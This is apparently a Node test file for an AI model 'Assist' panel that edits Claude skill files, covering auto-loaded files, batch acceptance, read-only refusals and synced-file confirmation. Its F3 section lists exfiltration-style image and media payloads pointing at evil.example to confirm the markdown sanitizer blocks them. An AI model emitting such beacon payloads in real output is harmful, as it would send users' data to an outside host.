/**
 * Assist finds its own files, in the page (builds/assist-auto-files B6, F3,
 * F6, F8, F10, F12): the real public/ scripts in a node VM against stubbed
 * routes (tests/fixtures/shell-page.mjs). No server, no HOME, no model.
 */
import path from 'node:path';
import { bootPage, routesFor, PUB } from './fixtures/shell-page.mjs';
import { ndjson } from './fixtures/fake-dom.mjs';

let pass = 0, fail = 0;
const ok = (name, cond, detail = '') => {
  if (cond) { pass++; console.log(`  ok   ${name}`); }
  else { fail++; console.log(`  FAIL ${name}${detail ? ` — ${detail}` : ''}`); }
};
const settle = (ms = 0) => new Promise((r) => setTimeout(r, ms));
const pages = [];
const boot = async (o) => { const p = await bootPage(o); pages.push(p); return p; };

const A = '~/.claude/skills/review/SKILL.md', B = '~/.claude/skills/ship/SKILL.md', RO = '~/.claude/plugins/cache/m/p/1/skills/x/SKILL.md';
const id = (c) => c.repeat(32);
const prop = (display, over = {}) => ({ id: id(display === A ? 'a' : 'b'), display, path: `/h/${display.slice(2)}`, kind: 'edit', edits: 1,
  origin: 'loaded', originLabel: 'pulled in by Assist', cls: 'user', current: 'astra\n', proposed: 'opus\n', ...over });
const loadedFiles = [{ display: A, readOnly: false, cls: 'user', kind: 'skill' }, { display: B, readOnly: false, cls: 'user', kind: 'skill' }];
const DONE = {
  t: 'done', ok: true, text: 'Changed both.', sessionId: 'sess-9',
  proposals: [prop(A), prop(B), { display: RO, error: 'Refused: this file is read-only (belongs to a plugin). ACS loaded it for reading only.', refused: true }],
  loaded: loadedFiles, scope: { searched: 34, loaded: 2, partial: false, line: 'Searched 34 files · loaded 2' }, stats: null,
};
const STREAM = [{ t: 'status', phase: 'finding' }, { t: 'searched', query: 'astra', searched: 34, matched: 2 }, { t: 'loaded', files: loadedFiles, refused: [] }, { t: 'round', n: 1 },
  { t: 'delta', text: 'Changed both.' }, DONE];

const freshSession = (p) => p.eval(`C.sessions = [{ id: 'sa', title: 'New session', mentions: [], loaded: [], blocked: [], createdAt: 0, updatedAt: 0, messages: [], slots: {} }]; C.activeId = 'sa';`);

{
  console.log('\nassist UI: B6 — a request with no attachment');
  const chats = [], batches = [], rejects = [];
  let releaseBatch;
  const routes = routesFor({
    'POST /api/chat': (b) => { chats.push(b); return ndjson(STREAM); },
    'POST /api/chat/accept-all': (b) => { batches.push(b); return new Promise((r) => { releaseBatch = () => r({ results: [
      { id: b.ids[0], display: A, outcome: 'applied', sha: 'abc' }, { id: b.ids[1], display: B, outcome: 'stale', message: 'The file changed since Assist proposed this.' }], applied: 1 }); }); },
    'POST /api/chat/reject': (b) => { rejects.push(b); return { rejected: b.ids.length }; },
  });
  const p = await boot({ routes });
  await settle(20);
  freshSession(p);
  p.$('btn-assist').click();
  await settle(5);
  const intro = p.text(p.$('drawer-body'));
  ok('B6 the intro invites a plain-language request; attaching is optional', /Assist finds the files it needs/.test(intro) && /optional/.test(intro) && !/Attach the files you want changed/.test(intro), intro);
  ok('B6 the placeholder no longer says you must attach', !/attach a file with @ to make edits/.test(p.$('chat-input').getAttribute('placeholder') || p.$('chat-input').placeholder || ''));
  ok('B6 "@ attach a file" stays, optional', p.$('drawer-compose').querySelectorAll('button').some((b) => p.text(b) === '@ attach a file'));
  p.eval(`C.draft = 'change astra to opus in my review skills'; sendTurn();`);
  await settle(40);
  ok('B6 a no-attachment send goes straight to the server', chats.length === 1 && chats[0].mentions.length === 0 && Array.isArray(chats[0].loaded) && Array.isArray(chats[0].blocked), JSON.stringify(chats[0]));
  const body = p.$('drawer-body');
  const pulled = body.querySelector('.pulled');
  ok('B6 "Assist pulled in 2 files", a chip each', pulled && /Assist pulled in 2 files/.test(p.text(pulled)) && pulled.querySelectorAll('.pulled-chip').length === 2, p.text(pulled));
  ok('F8 the scope line ACS computed is shown', p.text(body.querySelector('.msg-scope')) === 'Searched 34 files · loaded 2');
  ok('F10 the reply is the final round\'s text', p.eval('active().messages.at(-1).text') === 'Changed both.');
  ok('B6 the compose row keeps the pulled-in chips for later turns', p.$('drawer-compose').querySelectorAll('.pulled-row .pulled-chip').length === 2);
  ok('F2 an edit to an auto-loaded file is labelled as such', body.querySelectorAll('.prop').filter((c) => /pulled in by Assist/.test(p.text(c.querySelector('.prop-head')))).length === 2);
  ok('B4 the refused read-only edit shows its reason and has no Accept', body.querySelectorAll('.prop').some((c) => /read-only \(belongs to a plugin\)/.test(p.text(c)) && !c.querySelector('.btn.primary')));

  console.log('\nassist UI: F12 — Accept all');
  const allBtn = () => body.querySelectorAll('button').find((b) => /^Accept all/.test(p.text(b)));
  ok('F12 Accept all is offered for the 2 pending proposals (the refused one excluded)', p.text(allBtn()) === 'Accept all (2)');
  allBtn().click();
  await settle(5);
  const confirm = p.$('drawer-body').querySelector('.accept-all');
  ok('F12 before applying it lists the exact files: full paths and the count', /Apply these 2 files\?/.test(p.text(confirm)) &&
     confirm.querySelectorAll('li').map((li) => li.childNodes[0].textContent).join() === `${A},${B}`, p.text(confirm));
  ok('F12 nothing was sent yet', batches.length === 0);
  const apply = () => p.$('drawer-body').querySelectorAll('button').find((b) => /^Apply 2 files/.test(p.text(b)));
  apply().click();
  await settle(5);
  ok('F12 one batch in flight: Apply and every Accept are disabled meanwhile', p.eval('C.batch') === true && apply().disabled &&
     p.$('drawer-body').querySelectorAll('.prop .btn.primary').every((b) => b.disabled));
  apply().click();
  await settle(5);
  ok('F12 …and a second click sends nothing', batches.length === 1 && JSON.stringify(batches[0].ids) === JSON.stringify([id('a'), id('b')]));
  releaseBatch();
  await settle(20);
  const cards = p.$('drawer-body').querySelectorAll('.prop');
  ok('F12 per-file outcome: one applied, the stale one failed alone', /Applied and versioned/.test(p.text(cards[0])) && /changed since this was proposed/.test(p.text(cards[1])), cards.map((c) => p.text(c)).join(' | '));
  ok('F12 the batch result line', /Applied 1 of 2 · 1 stale\./.test(p.text(p.$('drawer-body'))));
  ok('F12 applied/stale proposals are excluded from another Accept all', !p.$('drawer-body').querySelectorAll('button').some((b) => /^Accept all/.test(p.text(b))));

  console.log('\nassist UI: F6 — removing a pulled-in chip');
  p.eval(`active().messages.push({ role: 'assistant', harness: 'claude', text: 'More.', proposals: [${JSON.stringify(prop(A, { id: id('c') }))}] }); renderChat();`);
  await settle(5);
  const chipX = p.$('drawer-compose').querySelectorAll('.pulled-row .mention-chip').find((c) => p.text(c).startsWith('review/SKILL.md')).querySelector('.mention-x');
  ok('F6 the remove control says it won\'t be read or edited again (not that it is forgotten)', /won't be read or edited again/.test(chipX.title) && !/forget/i.test(chipX.title));
  chipX.click();
  await settle(10);
  ok('F6 removed: off the session context, onto its blocked list', p.eval('active().loaded.map((f) => f.display).join()') === B && p.eval('active().blocked.join()') === A);
  ok('F6 its outstanding proposal is withdrawn, here and on the server', p.eval(`active().messages.at(-1).proposals[0].state`) === 'withdrawn' && rejects.some((r) => r.ids.includes(id('c'))));
  p.eval(`C.draft = 'next'; sendTurn();`);
  await settle(40);
  ok('F6 the next turn carries only the remaining file, and the removal', JSON.stringify(chats[1].loaded) === JSON.stringify([B]) && JSON.stringify(chats[1].blocked) === JSON.stringify([A]), JSON.stringify([chats[1].loaded, chats[1].blocked]));
  p.eval(`choosePicker({ path: '/h/.claude/skills/review/SKILL.md', display: ${JSON.stringify(A)} })`);
  ok('F6 attaching it again with @ lifts the removal', p.eval('active().blocked.length') === 0 && p.eval('active().mentions.length') === 1);
  ok('F6 the session survives a reload with its pulled-in and blocked lists', (() => { p.eval('saveSessions()'); const raw = JSON.parse(p.store.get('acs.sessions.v2')); return Array.isArray(raw.sessions[0].loaded) && Array.isArray(raw.sessions[0].blocked); })());
}

{
  console.log('\nassist UI: F10 — finding status, failures keep the chips');
  const p = await boot({ routes: routesFor({ 'POST /api/chat': () => ndjson([{ t: 'status', phase: 'finding' }, { t: 'loaded', files: loadedFiles, refused: [] }, { t: 'error', message: 'round two blew up', loaded: loadedFiles }]) }) });
  await settle(20);
  freshSession(p);
  p.$('btn-assist').click();
  p.eval(`C.busy = true; C.running = { harness: 'claude' }; C.phase = 'finding'; C.stream = ''; renderChatBody();`);
  ok('F10 while Assist is loading files the drawer says "Finding the files…", not raw @@NEED lines', /Finding the files…/.test(p.text(p.$('drawer-body'))));
  p.eval(`C.busy = false; C.phase = null; C.running = null; C.draft = 'go'; sendTurn();`);
  await settle(40);
  ok('F10 a failed round shows the error and keeps what was pulled in', /round two blew up/.test(p.text(p.$('drawer-body'))) && p.eval('active().loaded.length') === 2 && p.$('drawer-compose').querySelectorAll('.pulled-row .pulled-chip').length === 2);
}

{
  console.log('\nassist UI: synced proposals need the acknowledgement');
  const accepts = [];
  const p = await boot({ routes: routesFor({ 'POST /api/chat/accept': (b) => { accepts.push(b); if (!b.ackSync) throw { status: 409, body: { error: 'This skill is synced: confirm.', reason: 'synced' } }; return { saved: true, sha: 'f00dbabe' }; } }) });
  await settle(20);
  freshSession(p);
  p.$('btn-assist').click();
  p.eval(`active().messages.push({ role: 'assistant', harness: 'claude', text: 'x', proposals: [${JSON.stringify(prop(A, { synced: true, cls: 'synced' }))}] }); renderChat();`);
  await settle(5);
  const card = () => p.$('drawer-body').querySelector('.prop');
  ok('F4 a synced proposal says the next sync overwrites it', /next sync overwrites/.test(p.text(card())));
  card().querySelector('.btn.primary').click();
  await settle(10);
  ok('F4 the first Accept is refused for the acknowledgement; the button becomes "Accept anyway"', accepts[0].ackSync === false && p.text(card().querySelector('.btn.primary')) === 'Accept anyway');
  card().querySelector('.btn.primary').click();
  await settle(10);
  ok('F4 …which sends it, and applies', accepts[1].ackSync === true && /Applied and versioned/.test(p.text(card())));
}

{
  console.log('\nassist UI: F3 — no remote loads from model output');
  const p = await boot();
  await settle(20);
  let real = true;
  try { p.run(path.join(PUB, 'vendor', 'marked.min.js')); } catch { real = false; }
  if (!real || typeof p.eval('marked.parse') !== 'function') p.eval('marked.parse = (s) => s');
  const input = [
    '![status](https://evil.example/collect?d=1)',
    '',
    '<img src="https://evil.example/a.png"> <img src="//evil.example/b.png"> <img src="HTTPS://evil.example/c.png">',
    '<img srcset="https://evil.example/s.png 1x"> <video poster="https://evil.example/p.png" src="https://evil.example/v.mp4"></video>',
    '<audio src="https://evil.example/a.mp3"></audio> <p style="background:url(https://evil.example/bg)">bg</p> <table background="https://evil.example/t.png"></table>',
    '<svg><image href="https://evil.example/i.png"></image></svg>',
    '<img src="/icon.svg" alt="local"> <img src="data:image/png;base64,AAAA" alt="inline"> <a href="https://example.com/doc">a link</a>',
  ].join('\n');
  const html = p.eval(`renderMarkdown(${JSON.stringify(input)})`);
  const remoteIn = (markup) => {
    const host = p.doc.createElement('div');
    host.innerHTML = markup;
    return host.querySelectorAll('*').filter((n) => n.attributes.some((a) => (/^(src|srcset|poster|background|style)$/.test(a.name) ||
      (a.name === 'href' && n.tagName.toLowerCase() === 'image')) && /evil\.example/.test(a.value)));
  };
  const raw = remoteIn(p.eval(`marked.parse(${JSON.stringify(input)})`));
  ok('F3 negative control: unsanitized, the same input has remote loads the check sees', raw.length >= 8, String(raw.length));
  const remote = remoteIn(html);
  ok(`F3 no element keeps a remote src / srcset / poster / background / style url / svg href (marked: ${real ? 'real' : 'passthrough'})`, remote.length === 0, remote.map((n) => n.outerHTML.slice(0, 80)).join(' | '));
  ok('F3 the markdown image itself is gone or inert', !/evil\.example\/collect/.test(html.replace(/alt="[^"]*"/g, '')), html.slice(0, 300));
  ok('F3 same-origin and data: images stay', /src="\/icon\.svg"/.test(html) && /src="data:image\/png;base64,AAAA"/.test(html));
  ok('F3 a link is kept (it loads nothing until clicked)', /href="https:\/\/example\.com\/doc"/.test(html));
  const before = p.requests.length;
  p.eval(`C.sessions = [{ id: 'sx', title: 't', mentions: [], loaded: [], blocked: [], createdAt: 0, updatedAt: 0, slots: {}, messages: [{ role: 'assistant', harness: 'claude', text: '![x](https://evil.example/?d=secret) <img src="https://evil.example/?d=2">', proposals: [] }] }]; C.activeId = 'sx';`);
  p.$('btn-assist').click();
  await settle(5);
  const imgs = p.$('drawer-body').querySelectorAll('img').filter((i) => /evil/.test(i.getAttribute('src') || ''));
  ok('F3 an Assist reply with a remote image renders no remote src', imgs.length === 0 && p.requests.slice(before).every((r) => !/evil/.test(r.path)));
}

for (const p of pages) { p.done(); for (const s of p.sources) s.close(); }
const stray = pages.flatMap((p) => p.errors);
ok('no page errors', stray.length === 0, stray.slice(0, 3).join(' | '));
console.log(`\n${pass} passed, ${fail} failed\n`);
process.exit(fail === 0 ? 0 : 1);
